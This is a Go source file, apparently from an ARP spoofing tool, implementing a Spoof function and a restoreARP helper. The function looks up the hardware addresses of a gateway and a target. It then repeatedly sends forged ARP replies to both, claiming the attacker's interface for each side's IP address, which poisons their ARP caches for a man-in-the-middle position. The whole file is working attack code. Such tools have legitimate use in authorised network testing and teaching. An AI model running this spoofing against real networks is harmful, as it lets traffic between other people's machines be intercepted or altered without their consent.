package spoof

import (
	"context"
	"errors"
	"net"
	"sync"
	"time"

	"github.com/Onyz107/arpspoofer/handle"
	"github.com/Onyz107/arpspoofer/internal/arp"
	"github.com/Onyz107/arpspoofer/internal/hwid"
	"github.com/Onyz107/arpspoofer/internal/logger"
)

func Spoof(ctx context.Context, ifaceHandle *handle.Handle, hostIP, targetIP net.IP,
	interval time.Duration, restore bool, verbose bool) (stopFunc func(), err error) {
	inCtx, cancel := context.WithCancel(ctx)

	hostHWID, err := hwid.GetFromIP(ctx, ifaceHandle, hostIP, verbose)
	if err != nil {
		cancel()
		return nil, errors.Join(ErrGetHostHWID, err)
	}

	targetHWID, err := hwid.GetFromIP(ctx, ifaceHandle, targetIP, verbose)
	if err != nil {
		cancel()
		return nil, errors.Join(ErrGetTargetHWID, err)
	}

	// The packet to be sent to the host/gateway, telling it that we are the target.
	pktToHost, err := arp.BuildPkt(ifaceHandle.HWID, targetIP, ifaceHandle.HWID, hostIP, hostHWID, arp.ARPReply)
	if err != nil {
		cancel()
		return nil, errors.Join(ErrBuildHostPacket, err)
	}

	// The packet to be sent to the target, telling it that we are the host/gateway.
	pktToTarget, err := arp.BuildPkt(ifaceHandle.HWID, hostIP, ifaceHandle.HWID, targetIP, targetHWID, arp.ARPReply)
	if err != nil {
		cancel()
		return nil, errors.Join(ErrBuildTargetPacket, err)
	}

	var wg sync.WaitGroup
	wg.Go(func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		errCount := 0

		for {
			select {
			case <-inCtx.Done():
				return
			case <-ticker.C:
				if err := ifaceHandle.WritePacketData(pktToHost, verbose); err != nil {
					logger.Logger.Errorf("error sending packet to host: %v\n", err)
					errCount++
				}

				if err := ifaceHandle.WritePacketData(pktToTarget, verbose); err != nil {
					logger.Logger.Errorf("error sending packet to target: %v\n", err)
					errCount++
				}

				if errCount >= errThreshold {
					logger.Logger.Errorf("exceeded error threshold, stopping spoofing\n")
					cancel()
					return
				}
			}
		}
	})

	stopFunc = func() {
		cancel()
		wg.Wait()
		if restore {
			if err := restoreARP(ifaceHandle, hostIP, targetIP,
				hostHWID, targetHWID, interval, verbose); err != nil {
				logger.Logger.Errorf("error restoring ARP tables: %v\n", err)
			}
		}
	}

	return stopFunc, nil
}

func restoreARP(ifaceHandle *handle.Handle, hostIP, targetIP net.IP,
	hostHWID, targetHWID net.HardwareAddr, interval time.Duration, verbose bool) error {
	// The packet to be sent to the host/gateway, telling it the target's HWID.
	pktToHost, err := arp.BuildPkt(ifaceHandle.HWID, targetIP, targetHWID, hostIP, hostHWID, arp.ARPReply)
	if err != nil {
		return errors.Join(ErrBuildHostPacket, err)
	}

	// The packet to be sent to the target, telling it that host's HWID.
	pktToTarget, err := arp.BuildPkt(ifaceHandle.HWID, hostIP, hostHWID, targetIP, targetHWID, arp.ARPReply)
	if err != nil {
		return errors.Join(ErrBuildTargetPacket, err)
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for range restoreAttempts {
		<-ticker.C

		if err := ifaceHandle.WritePacketData(pktToHost, verbose); err != nil {
			logger.Logger.Errorf("error restoring packet to host: %v\n", err)
		}
		if err := ifaceHandle.WritePacketData(pktToTarget, verbose); err != nil {
			logger.Logger.Errorf("error restoring packet to target: %v\n", err)
		}
	}
	return nil
}
